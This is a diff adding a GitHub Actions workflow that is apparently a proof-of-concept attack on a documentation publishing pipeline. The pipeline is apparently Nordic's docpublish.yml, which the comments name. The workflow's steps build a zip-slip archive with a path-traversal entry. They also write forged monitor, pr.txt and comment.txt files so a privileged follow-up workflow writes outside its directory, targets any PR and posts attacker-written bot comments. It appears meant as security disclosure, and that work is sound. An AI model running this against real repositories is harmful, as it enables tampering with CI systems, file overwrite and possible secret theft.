@@ -1,0 +1,63 @@
+name: POC Documentation Build
+
+# 模拟 docbuild.yml 的角色：PR 触发，产出攻击者可控的 artifact
+on:
+  pull_request:
+    paths: ['poc-trigger/**']
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Craft malicious artifact
+        run: |
+          mkdir -p docs
+
+          # === Attack 1: zip-slip ===
+          # 构造含路径穿越条目的 zip，目标落在 OUTDIR 之外
+          python3 - <<'PYEOF'
+          import zipfile
+          with zipfile.ZipFile('docs/legacy-ncs-pr-999.zip', 'w') as zf:
+              # 正常条目（伪装成文档）
+              zf.writestr('index.html', '<h1>Totally normal docs</h1>')
+              # 路径穿越条目：../../zipslip_pwned.txt
+              # unzip -d ncs/PR-999 时，此条目尝试写到 docs/zipslip_pwned.txt
+              info = zipfile.ZipInfo('../../zipslip_pwned.txt')
+              zf.writestr(info, '[ZIP-SLIP SUCCESS] Written outside OUTDIR by attacker PR')
+          PYEOF
+
+          # === Attack 2: 通过 monitor 文件控制 OUTDIR 路径 ===
+          # docpublish.yml L27: awk 提取第3列 -> OUTDIR=ncs/<value>
+          echo "publish2 dev PR-999 legacy-ncs-pr-999.zip" > docs/monitor_12345.txt
+
+          # === Attack 3: pr.txt 冒充任意 PR 编号 ===
+          # docpublish.yml L37: PR=$(head -n 1 pr.txt | tr -cd '0-9')
+          # 将此处改成目标仓库中任意已存在的 PR 编号即可
+          echo "1" > docs/pr.txt
+
+          # === Attack 4: comment.txt 控制 bot 评论内容 ===
+          # docpublish.yml L106: body-path: docs/comment.txt
+          cat > docs/comment.txt <<'COMMENT'
+          ## [Security PoC] CI/CD Vulnerability Demonstration
+
+          > **This comment was injected via artifact manipulation.**
+
+          ### What happened:
+          - Triggered by: a fork PR (no write access to this repo)
+          - Running in: `workflow_run` privileged context (has `pull-requests: write`)
+          - `pr.txt` in the artifact pointed to **this PR** (could be any PR number)
+          - `comment.txt` controlled 100% by the attacker
+
+          ### In Nordic's real docpublish.yml this would also:
+          - Upload attacker-chosen files to Azure (via `NCS_DOC_SAS_PRS`)
+          - Potentially exfil secrets via zip-slip + file overwrite
+          COMMENT
+
+      - name: Upload malicious artifact
+        uses: actions/upload-artifact@4cec3d8aa04e39d1a68397de0c4cd6fb9dce8ec1 # v4
+        with:
+          name: docs
+          path: docs/
